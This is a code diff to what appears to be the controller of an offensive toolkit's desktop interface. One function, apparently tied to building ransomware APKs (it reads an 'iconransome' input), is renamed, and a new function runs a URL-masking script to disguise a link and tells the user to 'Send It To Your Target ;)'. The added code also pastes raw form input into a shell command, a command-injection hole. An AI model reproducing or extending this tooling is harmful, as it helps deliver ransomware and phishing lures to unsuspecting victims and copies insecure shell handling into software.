@@ -125,9 +125,9 @@ app.controller("AppCtrl", ($scope) => {
         }
     }
 
-    // function to run python file
+    // function to run sara python file
 
-        $appCtrl.callpy = () => {
+        $appCtrl.callsarapy = () => {
           $appCtrl.Log('Getting Icon from path input ', '..');
           var iconransome = document.getElementById('icon').value
           $appCtrl.Log('Applying APK name from input ', '..');
@@ -170,7 +170,36 @@ app.controller("AppCtrl", ($scope) => {
                 });
             }
 
+    // function to run mask python file
 
+    $appCtrl.callmaskpy = () => {
+          var targetmask = document.getElementById('targeturl').value
+          var hiddenmask = document.getElementById('hiddenurl').value          
+          var keywordmask = "-"
+          child = exec("cd maskurl && python3 maskurl.py --target "+targetmask+" --mask "+hiddenmask+" --keywords "+keywordmask,
+            function (error, stdout, stderr) {
+                //console.log('stdout: ' + stdout);
+                //console.log('stderr: ' + stderr);
+                if (error !== null) {
+                    if (targetmask.length == 0){
+                        $appCtrl.Log('Please Input The Desired URL To Be Hidden', CONSTANTS.logStatus.FAIL);
+                        }
+                    if (hiddenmask.length == 0){
+                        $appCtrl.Log('Please Input the URL To Hide By', CONSTANTS.logStatus.FAIL);
+                        }
+                        return;
+                        
+                    }
+                if (stdout.length != 0) {
+                    $appCtrl.Log(stdout+"     Just Copy This Url And Send It To Your Target ;)");
+
+                    //console.log('exec error: ' + error);
+                    return;
+
+    
+                }
+            });
+    }
 
 
 
